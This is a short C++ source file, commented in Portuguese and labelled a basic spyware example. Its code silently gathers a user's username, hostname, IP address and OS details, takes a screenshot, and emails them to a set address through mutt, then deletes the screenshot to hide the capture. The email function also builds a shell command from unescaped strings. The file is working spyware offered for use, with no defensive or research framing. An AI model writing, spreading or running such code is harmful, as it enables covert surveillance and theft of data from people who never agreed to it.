/*

Exemplo básico de spyware em c++

*/

#include <iostream>
#include <fstream>
#include <string>
#include <sstream>
#include <unistd.h>
#include <sys/types.h>
#include <pwd.h>
#include <sys/utsname.h>
#include <ctime>
#include <cstdlib>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <opencv2/opencv.hpp>

// Configurações do spyware
std::string sender_email = "seu_email@gmail.com";
std::string sender_password = "sua_senha";
std::string receiver_email = "email_destino@gmail.com";
std::string smtp_server = "smtp.gmail.com";
int smtp_port = 587;

// Função para capturar uma captura de tela
void capture_screenshot() {
    system("import -window root screenshot.png");
}

// Função para obter informações do sistema
std::string get_system_info() {
    std::stringstream info;
    
    // Obter o nome de usuário
    struct passwd *pwd = getpwuid(getuid());
    std::string username = pwd->pw_name;
    info << "Username: " << username << std::endl;

    // Obter o hostname
    char hostname[1024];
    gethostname(hostname, sizeof(hostname));
    info << "Hostname: " << hostname << std::endl;

    // Obter o endereço IP
    struct hostent *he;
    struct in_addr **addr_list;
    if ((he = gethostbyname(hostname)) != NULL) {
        addr_list = (struct in_addr **)he->h_addr_list;
        if (addr_list[0] != NULL) {
            info << "IP Address: " << inet_ntoa(*addr_list[0]) << std::endl;
        }
    }

    // Obter informações do sistema operacional
    struct utsname sys_info;
    if (uname(&sys_info) == 0) {
        info << "OS: " << sys_info.sysname << std::endl;
        info << "Processor: " << sys_info.machine << std::endl;
        info << "Architecture: " << sys_info.machine << std::endl;
    }

    // Obter data e hora atual
    std::time_t now = std::time(nullptr);
    std::tm *local_time = std::localtime(&now);
    char datetime[100];
    strftime(datetime, sizeof(datetime), "%Y-%m-%d %H:%M:%S", local_time);
    info << "Date and Time: " << datetime << std::endl;

    return info.str();
}

// Função para enviar um e-mail com as informações coletadas
void send_email(const std::string& subject, const std::string& body, const std::string& attachment = "") {
    std::string command = "echo \"" + body + "\" | mutt -s \"" + subject + "\" -a \"" + attachment + "\" -- " + receiver_email;
    int result = system(command.c_str());
    if (result == 0) {
        std::cout << "E-mail enviado com sucesso!" << std::endl;
    } else {
        std::cout << "Erro ao enviar e-mail." << std::endl;
    }
}

// Função principal
int main() {
    // Captura de informações do sistema
    std::string system_info = get_system_info();

    // Captura de uma captura de tela
    capture_screenshot();

    // Envia um e-mail com as informações coletadas e a captura de tela
    send_email("Relatório do Spyware", system_info, "screenshot.png");

    // Apaga a captura de tela após o envio
    std::remove("screenshot.png");

    return 0;
}